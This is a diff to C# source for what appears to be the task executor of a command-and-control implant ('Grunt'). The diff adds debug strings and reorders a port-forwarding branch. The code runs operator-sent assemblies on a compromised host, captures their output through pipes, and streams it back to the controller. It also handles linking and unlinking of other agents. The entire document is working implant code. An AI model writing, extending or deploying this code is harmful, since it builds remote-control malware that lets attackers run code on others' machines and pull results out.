@@ -790,6 +790,7 @@ namespace GruntExecutor
         {
             const int MAX_MESSAGE_SIZE = 1048576;
             string output = "";
+            string debuger = "";
             try
             {
                 if (message.Type == GruntTaskingType.Assembly)
@@ -807,90 +808,107 @@ namespace GruntExecutor
                         string results = "";
                         object objTask = new object();
                         var myMethodExists = gruntTask.GetType("Task").GetMethod("DummyPortFwd");
+                        var myTypeExists = gruntTask.GetType("Task");
+                        if (myMethodExists == null){
+                            debuger += "myMethodExists is null";
+                        }else{
+                            debuger += "myMethodExists is not null";
+                        }
 
-                        if (streamProp == null)
+                        if (myTypeExists == null){
+                            debuger += "myTypeExists is null";
+                        }else{
+                            debuger += "myTypeExists is not null";
+                        }
+
+                        if (streamProp == null){
+                            debuger += "streamProp is null";
+                        }else{
+                            debuger += "streamProp is not null";
+                        }
+
+                        if (myMethodExists != null)
+                        {
+                            string params_str = string.Join("", parameters);
+                            results = Portfwd.dealwithit(params_str);
+                            if (results != null) { output += (string)results; }
+                        }
+                        
+                        else if (streamProp == null)
                         {
                             results = (string) gruntTask.GetType("Task").GetMethod("Execute").Invoke(null, parameters);
                         }
+                        
                         else
                         {
-                            if (myMethodExists != null)
+                            Thread invokeThread = new Thread(() => results = (string) gruntTask.GetType("Task").GetMethod("Execute").Invoke(null, parameters));
+                            using (AnonymousPipeServerStream pipeServer = new AnonymousPipeServerStream(PipeDirection.In, HandleInheritability.Inheritable))
                             {
-                                string params_str = string.Join("", parameters);
-                                results = Portfwd.dealwithit(params_str);
-                                if (results != null) { output += (string)results; }
-                            }
-                            else
-                            {
-                                Thread invokeThread = new Thread(() => results = (string)gruntTask.GetType("Task").GetMethod("Execute").Invoke(null, parameters));
-                                using (AnonymousPipeServerStream pipeServer = new AnonymousPipeServerStream(PipeDirection.In, HandleInheritability.Inheritable))
+                                using (AnonymousPipeClientStream pipeClient = new AnonymousPipeClientStream(PipeDirection.Out, pipeServer.GetClientHandleAsString()))
                                 {
-                                    using (AnonymousPipeClientStream pipeClient = new AnonymousPipeClientStream(PipeDirection.Out, pipeServer.GetClientHandleAsString()))
+                                    streamProp.SetValue(null, pipeClient, null);
+                                    DateTime lastTime = DateTime.Now;
+                                    invokeThread.Start();
+                                    using (StreamReader reader = new StreamReader(pipeServer))
                                     {
-                                        streamProp.SetValue(null, pipeClient, null);
-                                        DateTime lastTime = DateTime.Now;
-                                        invokeThread.Start();
-                                        using (StreamReader reader = new StreamReader(pipeServer))
-                                        {
-                                            object synclock = new object();
-                                            string currentRead = "";
-                                            Thread readThread = new Thread(() =>
+                                        object synclock = new object();
+                                        string currentRead = "";
+                                        Thread readThread = new Thread(() => {
+                                            int count;
+                                            char[] read = new char[MAX_MESSAGE_SIZE];
+                                            while ((count = reader.Read(read, 0, read.Length)) > 0)
                                             {
-                                                int count;
-                                                char[] read = new char[MAX_MESSAGE_SIZE];
-                                                while ((count = reader.Read(read, 0, read.Length)) > 0)
-                                                {
-                                                    lock (synclock)
-                                                    {
-                                                        currentRead += new string(read, 0, count);
-                                                    }
-                                                }
-                                            });
-                                            readThread.Start();
-                                            while (readThread.IsAlive)
-                                            {
-                                                Thread.Sleep(Delay * 1000);
                                                 lock (synclock)
                                                 {
-                                                    try
-                                                    {
-                                                        if (currentRead.Length >= MAX_MESSAGE_SIZE)
-                                                        {
-                                                            for (int i = 0; i < currentRead.Length; i += MAX_MESSAGE_SIZE)
-                                                            {
-                                                                string aRead = currentRead.Substring(i, Math.Min(MAX_MESSAGE_SIZE, currentRead.Length - i));
-                                                                try
-                                                                {
-                                                                    GruntTaskingMessageResponse response = new GruntTaskingMessageResponse(GruntTaskingStatus.Progressed, aRead);
-                                                                    messenger.QueueTaskingMessage(response.ToJson(), message.Name);
-                                                                }
-                                                                catch (Exception) { }
-                                                            }
-                                                            currentRead = "";
-                                                            lastTime = DateTime.Now;
-                                                        }
-                                                        else if (currentRead.Length > 0 && DateTime.Now > (lastTime.Add(TimeSpan.FromSeconds(Delay))))
-                                                        {
-                                                            GruntTaskingMessageResponse response = new GruntTaskingMessageResponse(GruntTaskingStatus.Progressed, currentRead);
-                                                            messenger.QueueTaskingMessage(response.ToJson(), message.Name);
-                                                            currentRead = "";
-                                                            lastTime = DateTime.Now;
-                                                        }
-                                                    }
-                                                    catch (ThreadAbortException) { break; }
-                                                    catch (Exception) { currentRead = ""; }
+                                                    currentRead += new string(read, 0, count);
                                                 }
                                             }
-                                            output += currentRead;
+                                        });
+                                        readThread.Start();
+                                        while (readThread.IsAlive)
+                                        {
+                                            Thread.Sleep(Delay * 1000);
+                                            lock (synclock)
+                                            {
+                                                try
+                                                {
+                                                    if (currentRead.Length >= MAX_MESSAGE_SIZE)
+                                                    {
+                                                        for (int i = 0; i < currentRead.Length; i += MAX_MESSAGE_SIZE)
+                                                        {
+                                                            string aRead = currentRead.Substring(i, Math.Min(MAX_MESSAGE_SIZE, currentRead.Length - i));
+                                                            try
+                                                            {
+                                                                GruntTaskingMessageResponse response = new GruntTaskingMessageResponse(GruntTaskingStatus.Progressed, aRead);
+                                                                messenger.QueueTaskingMessage(response.ToJson(), message.Name);
+                                                            }
+                                                            catch (Exception) {}
+                                                        }
+                                                        currentRead = "";
+                                                        lastTime = DateTime.Now;
+                                                    }
+                                                    else if (currentRead.Length > 0 && DateTime.Now > (lastTime.Add(TimeSpan.FromSeconds(Delay))))
+                                                    {
+                                                        GruntTaskingMessageResponse response = new GruntTaskingMessageResponse(GruntTaskingStatus.Progressed, currentRead);
+                                                        messenger.QueueTaskingMessage(response.ToJson(), message.Name);
+                                                        currentRead = "";
+                                                        lastTime = DateTime.Now;
+                                                    }
+                                                }
+                                                catch (ThreadAbortException) { break; }
+                                                catch (Exception) { currentRead = ""; }
+                                            }
                                         }
+                                        output += currentRead;
                                     }
                                 }
-                                invokeThread.Join();
                             }
+                            invokeThread.Join();
                         }
                         output += results;
                     }
                 }
+
                 else if (message.Type == GruntTaskingType.Connect)
                 {
                     string[] split = message.Message.Split(',');
@@ -898,11 +916,13 @@ namespace GruntExecutor
                     output += connected ? "Connection to " + split[0] + ":" + split[1] + " succeeded!" :
                                           "Connection to " + split[0] + ":" + split[1] + " failed.";
                 }
+
                 else if (message.Type == GruntTaskingType.Disconnect)
                 {
                     bool disconnected = messenger.Disconnect(message.Message);
                     output += disconnected ? "Disconnect succeeded!" : "Disconnect failed.";
                 }
+
             }
             catch (Exception e)
             {
